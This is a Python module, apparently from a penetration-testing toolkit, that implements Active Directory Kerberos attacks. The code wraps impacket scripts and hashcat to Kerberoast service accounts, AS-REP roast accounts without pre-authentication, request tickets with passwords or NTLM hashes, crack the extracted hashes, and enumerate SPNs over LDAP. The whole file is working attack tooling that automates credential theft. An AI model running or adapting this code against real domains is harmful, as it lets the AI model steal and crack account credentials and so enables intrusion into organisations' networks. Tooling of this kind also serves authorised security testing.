"""Kerberos-based attacks for Active Directory."""

import re
import subprocess
from typing import List, Dict, Optional, Any
from pathlib import Path


class KerberosAttacker:
    """Kerberos attack implementations."""

    def __init__(self):
        """Initialize Kerberos attacker."""
        pass

    def kerberoast(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: Optional[str] = None
    ) -> List[Dict[str, str]]:
        """Execute Kerberoasting attack to extract service account hashes.

        Args:
            domain: Target domain
            username: Domain username
            password: User password
            dc_ip: Optional DC IP address

        Returns:
            List of dictionaries with username, SPN, and extractable hash
        """
        try:
            # Build GetUserSPNs command
            cmd = [
                "GetUserSPNs.py",
                f"{domain}/{username}:{password}"
            ]

            if dc_ip:
                cmd.extend(["-dc-ip", dc_ip])

            cmd.append("-request")

            # Execute
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )

            if result.returncode != 0:
                print(f"❌ Kerberoast failed: {result.stderr}")
                return []

            # Parse output
            return self._parse_kerberoast_output(result.stdout)

        except FileNotFoundError:
            print("❌ GetUserSPNs.py not found (install impacket)")
            return []
        except Exception as e:
            print(f"❌ Kerberoast error: {e}")
            return []

    def _parse_kerberoast_output(self, output: str) -> List[Dict[str, str]]:
        """Parse GetUserSPNs output to extract hashes.

        Args:
            output: Raw command output

        Returns:
            List of parsed results
        """
        results = []
        current_spn = None
        current_user = None
        hash_buffer = []
        in_hash = False

        for line in output.split('\n'):
            line = line.strip()

            # Parse SPN line
            if line and not line.startswith('$') and '/' in line:
                parts = line.split()
                if len(parts) >= 2:
                    current_spn = parts[0]
                    current_user = parts[1]

            # Detect hash start
            if line.startswith('$krb5tgs$'):
                in_hash = True
                hash_buffer = [line]

            # Continue hash
            elif in_hash:
                if line and not line.startswith('ServicePrincipalName'):
                    hash_buffer.append(line)
                else:
                    # Hash complete
                    if hash_buffer and current_user:
                        results.append({
                            'username': current_user,
                            'spn': current_spn or 'unknown',
                            'hash': ''.join(hash_buffer)
                        })
                    in_hash = False
                    hash_buffer = []

        # Handle trailing hash
        if hash_buffer and current_user:
            results.append({
                'username': current_user,
                'spn': current_spn or 'unknown',
                'hash': ''.join(hash_buffer)
            })

        return results

    def asreproast(
        self,
        domain: str,
        user_list: Optional[str] = None,
        dc_ip: Optional[str] = None
    ) -> List[Dict[str, str]]:
        """Execute AS-REP roasting to find accounts without Kerberos pre-auth.

        Args:
            domain: Target domain
            user_list: Optional path to file with usernames
            dc_ip: Optional DC IP address

        Returns:
            List of dictionaries with username and hash
        """
        try:
            # Build GetNPUsers command
            cmd = ["GetNPUsers.py", domain + "/"]

            if user_list:
                cmd.extend(["-usersfile", user_list])

            if dc_ip:
                cmd.extend(["-dc-ip", dc_ip])

            cmd.append("-format")
            cmd.append("hashcat")

            # Execute
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )

            # Parse output (exit code may be non-zero even with results)
            return self._parse_asreproast_output(result.stdout)

        except FileNotFoundError:
            print("❌ GetNPUsers.py not found (install impacket)")
            return []
        except Exception as e:
            print(f"❌ AS-REP roast error: {e}")
            return []

    def _parse_asreproast_output(self, output: str) -> List[Dict[str, str]]:
        """Parse GetNPUsers output to extract hashes.

        Args:
            output: Raw command output

        Returns:
            List of parsed results
        """
        results = []

        for line in output.split('\n'):
            line = line.strip()

            # Look for AS-REP hash
            if line.startswith('$krb5asrep$'):
                # Extract username from hash
                match = re.search(r'\$krb5asrep\$23\$([^@]+)@', line)
                username = match.group(1) if match else 'unknown'

                results.append({
                    'username': username,
                    'hash': line
                })

        return results

    def request_tgt(
        self,
        domain: str,
        username: str,
        password: Optional[str] = None,
        ntlm_hash: Optional[str] = None,
        output_path: Optional[str] = None
    ) -> Optional[str]:
        """Request a Ticket Granting Ticket (TGT).

        Args:
            domain: Target domain
            username: Domain username
            password: User password (if not using hash)
            ntlm_hash: NTLM hash (if not using password)
            output_path: Optional path to save ticket

        Returns:
            Path to ticket file or None on error
        """
        try:
            # Build getTGT command
            if password:
                cmd = [
                    "getTGT.py",
                    f"{domain}/{username}:{password}"
                ]
            elif ntlm_hash:
                cmd = [
                    "getTGT.py",
                    f"{domain}/{username}",
                    "-hashes",
                    f":{ntlm_hash}"
                ]
            else:
                return None

            # Execute
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=output_path or "/tmp"
            )

            if result.returncode == 0:
                # Ticket saved as username.ccache
                ticket_path = Path(output_path or "/tmp") / f"{username}.ccache"
                return str(ticket_path)

            return None

        except Exception as e:
            print(f"❌ TGT request error: {e}")
            return None

    def request_service_ticket(
        self,
        domain: str,
        username: str,
        password: str,
        spn: str,
        output_path: Optional[str] = None
    ) -> Optional[str]:
        """Request a service ticket for a specific SPN.

        Args:
            domain: Target domain
            username: Domain username
            password: User password
            spn: Service Principal Name
            output_path: Optional path to save ticket

        Returns:
            Path to ticket file or None on error
        """
        try:
            cmd = [
                "getST.py",
                f"{domain}/{username}:{password}",
                "-spn",
                spn
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=output_path or "/tmp"
            )

            if result.returncode == 0:
                # Ticket saved
                return str(Path(output_path or "/tmp") / f"{username}.ccache")

            return None

        except Exception as e:
            print(f"❌ Service ticket request error: {e}")
            return None

    def crack_hash(
        self,
        hash_value: str,
        wordlist: str,
        hash_type: str = "kerberos"
    ) -> Optional[str]:
        """Crack a Kerberos hash using hashcat or john.

        Args:
            hash_value: The hash to crack
            wordlist: Path to wordlist
            hash_type: Type of hash (kerberos, asrep)

        Returns:
            Cracked password or None
        """
        try:
            # Try hashcat first
            hash_mode = "13100" if hash_type == "kerberos" else "18200"

            # Save hash to temp file
            hash_file = "/tmp/krb_hash.txt"
            with open(hash_file, 'w') as f:
                f.write(hash_value)

            cmd = [
                "hashcat",
                "-m", hash_mode,
                "-a", "0",
                hash_file,
                wordlist,
                "--quiet"
            ]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )

            # Parse cracked password
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if ':' in line:
                        return line.split(':')[-1].strip()

            return None

        except FileNotFoundError:
            print("❌ hashcat not found")
            return None
        except Exception as e:
            print(f"❌ Hash cracking error: {e}")
            return None

    def enumerate_spns(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: Optional[str] = None
    ) -> List[Dict[str, str]]:
        """Enumerate Service Principal Names in the domain.

        Args:
            domain: Target domain
            username: Domain username
            password: User password
            dc_ip: Optional DC IP

        Returns:
            List of SPNs with associated accounts
        """
        try:
            import ldap3

            server = ldap3.Server(dc_ip or domain, get_info=ldap3.ALL)
            conn = ldap3.Connection(
                server,
                user=f"{username}@{domain}",
                password=password,
                auto_bind=True
            )

            domain_dn = ','.join([f"DC={dc}" for dc in domain.split('.')])

            conn.search(
                search_base=domain_dn,
                search_filter='(&(objectClass=user)(servicePrincipalName=*))',
                attributes=['sAMAccountName', 'servicePrincipalName']
            )

            results = []
            for entry in conn.entries:
                if hasattr(entry, 'servicePrincipalName'):
                    for spn in entry.servicePrincipalName.values:
                        results.append({
                            'username': entry.sAMAccountName.value,
                            'spn': spn
                        })

            conn.unbind()
            return results

        except Exception as e:
            print(f"❌ SPN enumeration error: {e}")
            return []

    def check_preauth_not_required(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: Optional[str] = None
    ) -> List[str]:
        """Check for accounts with pre-authentication not required.

        Args:
            domain: Target domain
            username: Domain username
            password: User password
            dc_ip: Optional DC IP

        Returns:
            List of usernames without pre-auth
        """
        try:
            import ldap3

            server = ldap3.Server(dc_ip or domain, get_info=ldap3.ALL)
            conn = ldap3.Connection(
                server,
                user=f"{username}@{domain}",
                password=password,
                auto_bind=True
            )

            domain_dn = ','.join([f"DC={dc}" for dc in domain.split('.')])

            # DONT_REQ_PREAUTH = 0x400000
            conn.search(
                search_base=domain_dn,
                search_filter='(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
                attributes=['sAMAccountName']
            )

            results = []
            for entry in conn.entries:
                if hasattr(entry, 'sAMAccountName'):
                    results.append(entry.sAMAccountName.value)

            conn.unbind()
            return results

        except Exception as e:
            print(f"❌ Pre-auth check error: {e}")
            return []
